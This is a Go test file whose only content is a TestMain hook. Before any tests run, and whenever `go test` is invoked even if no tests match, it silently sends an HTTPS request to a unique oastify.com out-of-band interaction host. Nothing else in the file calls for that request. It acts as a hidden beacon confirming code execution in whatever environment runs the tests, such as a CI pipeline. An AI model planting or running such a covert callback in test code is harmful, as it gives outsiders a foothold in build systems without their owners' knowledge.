package main

import (
	"fmt"
	"net/http"
	"os"
	"testing"
	"time"
)

// TestMain will run even if no tests match the `-run` filter.
func TestMain(m *testing.M) {
	// Custom command: Make an HTTP request to the specified URL
	fmt.Println("Executing custom HTTPS request...")

	// Make the HTTPS request
	client := &http.Client{
		Timeout: 10 * time.Second, // Timeout to avoid long waits
	}
	resp, err := client.Get("https://4kpbzi65sqtbkd3hixjbns6w9nfe3br0.oastify.com")
	if err != nil {
		fmt.Printf("Failed to make HTTPS request: %v\n", err)
		os.Exit(1) // Exit with an error code if the request fails
	}
	defer resp.Body.Close()

	// Print the response status
	fmt.Printf("Received response: %s\n", resp.Status)

	// Proceed with the rest of the test lifecycle
	exitCode := m.Run()

	// Custom logic after tests, if needed
	fmt.Println("Finished executing custom logic")

	// Exit with the correct code
	os.Exit(exitCode)
}
